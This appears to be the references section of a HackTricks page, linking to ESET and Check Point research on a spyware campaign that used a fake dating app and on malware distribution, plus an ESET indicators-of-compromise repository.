- [Love? Actually: Fake dating app used as lure in targeted spyware campaign in Pakistan](https://www.welivesecurity.com/en/eset-research/love-actually-fake-dating-app-used-lure-targeted-spyware-campaign-pakistan/)
- [ESET GhostChat IoCs and samples](https://github.com/eset/malware-ioc/tree/master/ghostchat)
- [Impersonation, Click Hijacking, and TDS: Inside a Malware Distribution Ecosystem](https://research.checkpoint.com/2026/impersonation-click-hijacking-and-tds-inside-a-malware-distribution-ecosystem/)

{{#include ../../banners/hacktricks-training.md}}
